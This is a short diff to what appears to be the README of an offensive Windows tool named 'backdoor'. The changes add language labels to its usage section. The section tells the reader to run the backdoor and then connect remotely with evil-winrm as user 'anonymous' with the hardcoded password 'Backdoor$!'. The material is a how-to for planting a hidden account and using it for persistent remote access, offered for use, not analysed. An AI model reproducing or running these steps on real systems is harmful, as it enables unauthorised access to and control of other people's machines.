@@ -7,9 +7,12 @@
 <h1>USAGE:</h1>
 <br>
 
+powershell
 `.\backdoor`
 
 <br>
 <h1>LOGIN</h1>
+<br>
+bash
 
 `evil-winrm -i IP -u anonymous -p 'Backdoor$!'`
